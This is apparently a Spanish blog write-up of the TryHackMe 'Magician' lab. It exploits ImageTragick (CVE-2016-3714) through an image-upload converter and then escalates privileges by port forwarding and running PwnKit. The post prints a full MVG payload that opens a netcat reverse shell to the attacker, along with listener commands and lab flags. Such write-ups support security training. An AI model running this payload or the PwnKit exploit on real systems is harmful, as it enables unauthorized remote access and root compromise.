---
layout: post
author: jh3x
---

## WriteUp máquina **Magician**

Esta es una maquina con un nivel de dificultad Fácil en TryHackme vamos a ello:  
### Fase de reconocimineto
Como primer paso realizamos un ping a la maquina para identificar ante que maquina estamos:  

```console
PING 10.10.163.129 (10.10.163.129) 56(84) bytes of data.
64 bytes from 10.10.163.129: icmp_seq=1 ttl=63 time=236 ms
```

Como observamos la maquina nos responde con un TTL=63 por lo que nos enfrentamos a una maquina linux.  

El siguiente paso es ver que puertos abiertos tiene la maquina por lo que realizamos el siguiente escaneo:  

```console
nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.163.129 -oA allPorts
```
Y vemos los siguientes puertos abiertos:

| **PORT**  | **STATE SERVICE** | **SERVICE**     |
| 21/tcp    | open              | ftp             |
| 8080/tcp  | open              | http-proxy      |
| 8081/tcp  | open              | blackice-icecap |

Teniendo los puertos abiertos identificamos la version de los servicios expuestos con el siguiente comando:

```console
nmap -sC -sV -p21,8080,8081 10.10.163.129 -oA targeted
```
Dando como resultado los siguientes servicios:

```console
Host: 10.10.163.129 (10.10.163.129)	Status: Up
Host: 10.10.163.129 (10.10.163.129)	Ports: 21/open/tcp//ftp//vsftpd 2.0.8 or later/, 8080/open/tcp//http-proxy///, 8081/open/tcp//http//nginx 1.14.0 (Ubuntu)/
```
Inspeccionamos la web vemos dos puertos abiertos 8080 y 8081 en este caso nos enfocamos en el servicio web  
en el puerto 8081 ya que exsite una funcionalidad de subida de archivos donde la pagina convierte un archivo png a jpg:

![Panel](/images/writeup/magician/convert.png)

### Fase de explotacion

Despues de revisar la funcionalidad del sitio web en el que se convierte un archivo png a jpg encontre una potencial vulnerabilidad: *CVE-2016-3714*  
como primer paso hice uso del payload disponible en: **[ImageTragic](https://book.hacktricks.xyz/pentesting-web/file-upload#imagetragic)** pero la shell no se establecia correctamente

![Panel](/images/writeup/magician/Primer.png)


Luego le heche un vistazo a un exploit disponible en metaslpoit:


```console
msf6 exploit(unix/fileformat/imagemagick_delegate) > use exploit/linux/redis/redis_replication_cmd_exec

msf6 exploit(unix/fileformat/imagemagick_delegate) > show options

Module options (exploit/unix/fileformat/imagemagick_delegate):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILENAME   msf.png          yes       Output file
   USE_POPEN  true             no        Use popen() vector


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  <IP>             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   1   MVG file

```
Teniendo como resultado el siguiente payload generado en la ruta /root/.msf4/local/msf.png  


```console
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|mkfifo /tmp/qjgz; nc <IP> 4444 0</tmp/qjgz | /bin/sh >/tmp/qjgz 2>&1; rm /tmp/qjgz'
pop graphic-context
pop graphic-context

```
Se puede subir directamente la imagen generar pero yo decidi simplemente copiar el contenido del archivo a la peticion  
interceptada de burpsuite:

![Panel](/images/writeup/magician/revburp.png)

Subiendo este archivo nos ponemos a la escucha con netcat y recibimos una shell reversa para luego hacer un tratamiento de la tty:

```console
root@parrot ▓▒░ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.89.16 55846
script /dev/null -c bash
Script started, file is /dev/null
magician@magician:/tmp/hsperfdata_magician$ ^Z
zsh: suspended  nc -nlvp 4444

root@parrot ▓▒░ stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
                               reset xterm
```
Exportamos las variables de entorno:

```console
magician@magician:/tmp/hsperfdata_magician$ export TERM=xterm
magician@magician:/tmp/hsperfdata_magician$ export SHELL=bash

```

Y podemos ver la flag del usuario magician:

```console
THM{simsalabim_hex_hex}
```
### Escalada de privilegios

Como primer paso en la escalada de privilegios buscamos archivos suspechosos que puedan tener credenciales o archivos de configuracion  
en este caso encontramos un archivo 
![Panel](/images/writeup/magician/archive.png)

Inspeccionando el contenido de este archivo nos encontramos con un mensaje:  
  
**"The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows."**  
  
El mensaje nos da a entender que hay un puerto a la escucha por lo que verificamos puertos abiertos por lo que verificamos puertos a la escucha:  
  
![Panel](/images/writeup/magician/netstat.png)

Si bien no podemos ver este puerto desde afuera podemos realizar una tecnica llamada port forwarding con el siguiente comando:  

```console
magician@magician:~$ ssh -R 6666:127.0.0.1:6666 root@10.9.3.94                                                                                                                             
root@10.9.3.94's password:                                                                                                                                                                 
```
Asi redirigimos todo el trafico del puerto 6666 a nuestra maquina en el puerto 6666.


```console
root@parrot ▓▒░ nmap -sCV -p6666 127.0.0.1  
PORT     STATE SERVICE VERSION
6666/tcp open  http    Gunicorn 20.0.4                                                                                                                                                  
|_http-server-header: gunicorn/20.0.4                                                                                                                                                   
|_http-title: The Magic cat                                                                                                                                                             
|_irc-info: Unable to open connection  
```
Vemos un servicio HTTP expuesto pero el navegador restringe este tipo de puertos, por lo que debemos habilitar este puerto para ello debemos realizar el siguiente paso en firefox:  
  
![Panel](/images/writeup/magician/portsRestricted.png)

Habilitando este puerto en el navegador observamos un panel donde podemos ver un archivo en este caso se selecciona esta opcion hasta obtener una cadena en base64:  
  
![Panel](/images/writeup/magician/pANEL6666.png)  
  
Decodificamos el resultado y obtenemos la flag:
  
```console
root@parrot ▓▒░ echo "VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K" | base64 -d
THM{magic_may_make_many_men_mad}
```
### Forma alternativa
Un reciente vulnerabilidad fue expuesta en estas fechas por lo que hice la prueba si este binario funcionaria ya que pkexec tiene privilegios SUID  
para ello descargamos el exploit disponible en **[Pwnkit](https://github.com/ly4k/PwnKit)** :


```console
magician@magician:/tmp$ chmod +x  PwnKit 
magician@magician:/tmp$ ./PwnKit 
root@magician:/tmp# cd /root
root@magician:~# ls
ImageMagick  flask  root.txt
root@magician:~# cat root.txt 
THM{magic_may_make_many_men_mad}
```

